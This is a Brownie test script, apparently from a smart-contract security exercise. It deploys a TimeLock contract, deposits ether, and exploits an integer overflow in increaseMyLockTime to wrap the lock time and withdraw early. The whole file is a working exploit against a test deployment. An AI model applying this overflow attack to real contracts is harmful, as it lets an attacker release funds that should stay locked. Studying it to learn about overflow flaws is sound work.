from brownie import accounts, TimeLock

def test_overflow_1():
    #Assigning account variables
    [dep, attacker] = accounts[:2]

    #Deploying target
    tl = TimeLock.deploy({'from': dep})

    # Making a deposit
    tl.depositETH({'from': attacker, 'value': '5 ethers'})
    assert(tl.getBalance(attacker) == 5e18)
    #Asserting Time Lock period
    assert(tl.getLocktime(attacker) >= 1682733750)

    # Assinging value to int overflow 
    x = 2**256 - tl.getLocktime(attacker)
    # Exploiting int overflow to reset LockTime
    tl.increaseMyLockTime((x+1),{'from': attacker})

    tl.withdrawETH({'from': attacker})
    # Confirming that my Lock Time have being bypassed
    assert(tl.getBalance(attacker) == 0)

